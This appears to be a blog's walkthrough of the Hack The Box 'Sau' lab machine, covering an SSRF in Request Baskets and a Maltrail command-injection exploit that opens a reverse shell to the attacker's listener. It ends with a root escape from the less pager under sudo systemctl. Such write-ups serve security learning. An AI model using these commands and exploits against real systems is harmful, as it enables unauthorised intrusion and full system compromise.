<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HTB | Sau Writeup</title>

  <!-- Styles -->
  <link rel="stylesheet" href="../css/style.css" />
  <link rel="stylesheet" href="../css/skins/color-red.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />

  <style>
    body.dark p, body.dark li {
      color: var(--text-black-700);
      line-height: 1.6;
      font-size: 16px;
    }
    code {
      background-color: #1e1e1e;
      color: #ff6b6b;
      padding: 2px 6px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
    }
    pre {
      background-color: #1e1e1e;
      color: #f8f8f2;
      padding: 10px 15px;
      border-radius: 5px;
      overflow-x: auto;
      margin-bottom: 20px;
      white-space: pre-wrap;
      word-break: break-word;
    }
    ul {
      padding-left: 1.5em;
      margin-bottom: 20px;
    }
    img {
      max-width: 100%;
      border: 2px solid #444;
      border-radius: 8px;
      margin: 20px 0;
    }
    h3 {
      color: var(--skin-color);
      margin-top: 40px;
      font-size: 24px;
    }
    .btn {
      margin-top: 40px;
    }
    hr {
      border: 0;
      border-top: 1px solid #444;
      margin: 30px 0;
    }
  </style>
</head>
<body class="dark">

<!-- Matrix Background -->
<canvas id="matrixCanvas"></canvas>
<script src="../js/matrix.js"></script>

<!-- Sidebar / Nav -->
<div class="aside">
  <div class="logo">
    <a href="../index.html"><span>L1chS3c</span></a>
    <div class="profile-pic">
      <img src="../images/profile.jpg" alt="Profile Picture">
    </div>
  </div>
  <ul class="nav">
    <li><a href="../index.html#home"><i class="fa fa-home"></i> Home</a></li>
    <li><a href="../index.html#about"><i class="fa fa-user"></i> About</a></li>
    <li><a href="../index.html#education"><i class="fa fa-book"></i> Education</a></li>
    <li><a href="../index.html#contact"><i class="fa fa-comments"></i> Contact</a></li>
    <li><a href="writeuphome.html" class="active"><i class="fa fa-terminal"></i> Writeups</a></li>
  </ul>
</div>

<!-- Main Writeup Content -->
<section class="section" style="padding-left: 15px;">
  <div class="container">
    <div class="section-title">
      <h2>HTB: Sau</h2>
    </div>

    <p style="font-size: 18px; margin-bottom: 30px;">
      Difficulty: Easy • OS: Linux • Tags: SSRF, RCE, Sudo Misconfig, Enumeration
    </p>

    <!-- BEGIN FULL WRITEUP -->
    <div style="white-space: pre-wrap; font-size: 16px; line-height: 1.7; color: var(--text-black-700);">
      <!-- Paste your full markdown writeup content here -->
      <!-- TO MAKE THIS CLEAN: Just wrap with <pre> if needed -->

<pre>
<!-- CONTENT BEGINS HERE -->
## Overview

**Sau** is an Easy-rated Linux box that showcases one of my favorite types of vulnerabilities: **Server-Side Request Forgery (SSRF)**. The initial entry point involved exploiting a misconfigured instance of Request Baskets using [CVE-2023-27163], which allowed forwarding HTTP requests to internal services not exposed to the public network. This led to the discovery of a Maltrail instance vulnerable to **unauthenticated OS command injection** ([CVE-2023-27561]), resulting in remote code execution as a low-privileged user. Privilege escalation was then achieved through a **sudo misconfiguration**, allowing execution of a systemctl command as root without a password. This box was a great example of how SSRF can be chained with internal service enumeration and misconfigurations to gain full system compromise.

---

## Initial Enumeration

We started with an all-ports Nmap scan:

```bash
└──╼ [★]$ nmap -p- -sC -sV -T4 10.129.229.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-03 13:57 CDT
Nmap scan report for 10.129.229.26
Host is up (0.0092s latency).
Not shown: 65531 closed tcp ports (reset)

| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 03 Apr 2025 18:58:33 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 03 Apr 2025 18:58:05 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 03 Apr 2025 18:58:05 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=4/3%Time=67EEDA3D%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html
SF:;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Thu,\x2003\x20Apr\x
SF:202025\x2018:58:05\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"
SF:/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x2
SF:0200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Thu,\x2003\x20Apr\x
SF:202025\x2018:58:05\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
SF:st,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nDate:\x20Thu,\x2003\x20Apr\x202025\x2018:58:33\x20GMT
SF:\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20n
SF:ame\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\
SF:$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.38 seconds

```

### Results:

```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

An initial Nmap scan revealed that **SSH (port 22)** was open, while **ports 80 and 8338** were marked as **filtered**, meaning the server did not respond to probes — likely due to a firewall or host-based filtering rule. Interestingly, **port 55555** was open, which stood out as an uncommon service port. While port 80 typically indicates the presence of a web service, direct access to it was blocked. This led me to investigate port 55555 instead, which did respond — revealing a web application along with useful version information.


---

##  Request Baskets — SSRF (CVE-2023-27163)

Request Baskets 1.2.1 is vulnerable to **Server-Side Request Forgery (SSRF)**, allowing internal service access via the `/api/baskets/{name}` endpoint.

We created a new basket via `curl`:

Response:

```bash
 curl -X POST http://10.129.229.26:55555/api/baskets/test \ -H "Content-Type: application/json" -d '{}'
{"token":"ZPvBXMYYo5f8l5tzz5jf7YfQC3oON2FxTt1OPJbGjm_E"}curl: (3) URL using bad/illegal format or missing URL
curl: (3) URL using bad/illegal format or missing URL

```

We can also do this previous step with the help of burp

Simply turn on your proxy and create a box to capture the request in BURP. I use foxy proxy for this.


Now can can grab the request in burp and send it to repeater


## What Happens When You do This?

- The server creates a basket called `hackbox`
- It responds with a `token` (used as an API key for authorization)
- You can now use that basket to:
    - View or store intercepted requests
    - Modify its behavior (i.e., add SSRF forwarding!)

---

##  Verifying SSRF

We’re leveraging a vulnerability in the `/api/baskets/{name}` endpoint of Request Baskets, which allows us to configure arbitrary **request forwarding** — enabling **Server-Side Request Forgery (SSRF)**.

We set up a Python HTTP server on our attacker machine so we can catch inbound SSRF traffic:
`python3 -m http.server 8000`

This listens for incoming HTTP requests on port 8000. We'll use this to confirm whether the target server is making requests on our behalf.

Next, we reconfigure our `hackbox` basket with a **PUT** request. This sets the `forward_url` to our attack box, which turns the basket into an SSRF relay:


### Explanation:

- `forward_url`: Tells the server to **forward any requests** made to `/hackbox` to our attack box
- `proxy_response`: Allows us to **see the response** from the forwarded request
- `insecure_tls`: Bypasses HTTPS certificate validation (not used here, but good practice)

This makes the vulnerable server act as a **proxy** — it will now contact whatever host we define in 
`forward_url`.

With our listener running and the basket configured, we simply trigger the SSRF with:

```bash
curl http://10.129.229.26:55555/htb
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href=".bash_aliases">.bash_aliases</a></li>
<li><a href=".bashrc">.bashrc</a></li>
<li><a href=".BurpSuite/">.BurpSuite/</a></li>
<li><a href=".cache/">.cache/</a></li>
<li><a href=".config/">.config/</a></li>
<li><a href=".dbeaver4/">.dbeaver4/</a></li>
<li><a href=".dbus/">.dbus/</a></li>
<li><a href=".emacs">.emacs</a></li>
<li><a href=".gtkrc-2.0">.gtkrc-2.0</a></li>
<li><a href=".ICEauthority">.ICEauthority</a></li>
<li><a href=".java/">.java/</a></li>
<li><a href=".kde/">.kde/</a></li>
<li><a href=".local/">.local/</a></li>
<li><a href=".mozilla/">.mozilla/</a></li>
<li><a href=".msf4/">.msf4/</a></li>
<li><a href=".profile">.profile</a></li>
<li><a href=".pyenv/">.pyenv/</a></li>
<li><a href=".sudo_as_admin_successful">.sudo_as_admin_successful</a></li>
<li><a href=".vnc/">.vnc/</a></li>
<li><a href=".vscode/">.vscode/</a></li>
<li><a href=".Xauthority">.Xauthority</a></li>
<li><a href=".xsession-errors">.xsession-errors</a></li>
<li><a href=".zshrc">.zshrc</a></li>
<li><a href="cacert.der">cacert.der</a></li>
<li><a href="Desktop/">Desktop/</a></li>
<li><a href="Documents/">Documents/</a></li>
<li><a href="Downloads/">Downloads/</a></li>
<li><a href="Music/">Music/</a></li>
<li><a href="my_data/">my_data/</a></li>
<li><a href="Pictures/">Pictures/</a></li>
<li><a href="Public/">Public/</a></li>
<li><a href="Templates/">Templates/</a></li>
<li><a href="Videos/">Videos/</a></li>
</ul>
<hr>
</body>
</html>
```

 **SSRF confirmed.**

This response proves that:

1. The target server made an HTTP request to **our IP and port**
2. It sent the request **from the target’s internal network**
3. The target returned **our server’s response back to us**

### Why It Matters:

- This behavior confirms a **Server-Side Request Forgery**
- We can now target **internal services** that we normally couldn’t reach from the outside (like `127.0.0.1:80`)
- This will be our entry point to discovering **Maltrail** running on localhost and eventually getting RCE

---

## SSRF to Maltrail (Port 80)

We then pointed the basket to 127.0.0.1:80:


> This tells the vulnerable app:
> 
> 
> “Any time someone accesses `/hackbox`, I want you to make that same request to **your own localhost** on port 80.”
> 

We’re not scanning from our machine anymore — **we’re telling the vulnerable box to make a local HTTP request to itself**.

Now if we visit http://10.129.229.26:55555/hackbox….


 Revealed an instance of **Maltrail v0.53**

### Result: We See **Maltrail v0.53** in the Browser

- The SSRF successfully connected to the internal web service
- That service was **Maltrail**, which only listens on `127.0.0.1`
- We now see its login page or dashboard — **without ever having direct access to port 80**

---

## Remote Command Execution in Maltrail (v0.53)

After accessing the internal Maltrail instance through SSRF, we identified the version as **v0.53** — which is known to be vulnerable to **unauthenticated OS command injection** (CVE-2023-27561).

This vulnerability allows us to achieve **Remote Code Execution (RCE)** without needing to log in.

---

### Step 1: Download the Exploit

We grabbed the official PoC exploit from Exploit-DB:

```bash

curl -s https://www.exploit-db.com/download/51676 -o exploit.py

```

> This script abuses the sensor_name parameter, which is vulnerable to command injection when processed by the Maltrail backend.
> 

---

### Step 2: Start a Reverse Shell Listener

On our attack box, we started a listener to catch the shell:

```bash

nc -lvnp 4444

```

---

### Step 3: Fire the Exploit

We launched the exploit and passed in:

- Our IP and port for the reverse shell
- The URL to our SSRF basket (`/hackbox`), which is still proxying requests to `127.0.0.1:80`

```bash

python3 exploit.py 10.10.14.207 4444 http://10.129.229.26:55555/hackbox

```

---

### Result: Shell as `puma`

```bash

connect to [10.10.14.207] from (UNKNOWN) [10.129.229.26] 4444
whoami
puma

```

We’ve successfully exploited **Maltrail via SSRF**, achieved **RCE**, and gained an initial foothold as user `puma`.

---

## Privilege Escalation – From `puma` to `root`

After landing a shell as user `puma`, we checked for **sudo permissions**:

```bash
sudo -l

```

Output:

```bash

(ALL) NOPASSWD: /usr/bin/systemctl status trail.service

```

This revealed that the `puma` user can run `systemctl status trail.service` as **root**, without a password.

---

Why This Is Important

The `systemctl` status command **pipes its output through `less`**, a pager utility. In vulnerable versions of systemd (like 245, found on this box), the **`LESSSECURE`** environment variable isn’t properly enforced.

That means… inside the `less` pager, we can **break out and spawn a root shell**.

---

### 🔨 Step-by-Step Privesc

1. Run the allowed command:
    
    ```bash
    
    sudo /usr/bin/systemctl status trail.service
    
    ```
    
2. Once inside the `less` pager, press:
    
    ```
    
    !/bin/bash
    
    ```
    
    > The ! tells less to execute a shell command.
    > 
3. BOOM — you’re now root.


---

Root Confirmed

```bash
bash
CopyEdit
whoami
root

```

From SSRF to shell, now to **root**.

---

## 💡 Takeaways

- SSRF → Internal-only service enumeration
- Unauthenticated RCE via Maltrail
- Abuse of sudo with systemctl + `less` pager trick
- Easy privesc with no password

</pre>
    </div>
    <!-- END FULL WRITEUP -->

    <a href="writeuphome.html" class="btn">← Back to Writeups</a>
  </div>
</section>

<!-- Optional Script -->
<script src="../js/script.js"></script>
</body>
</html>
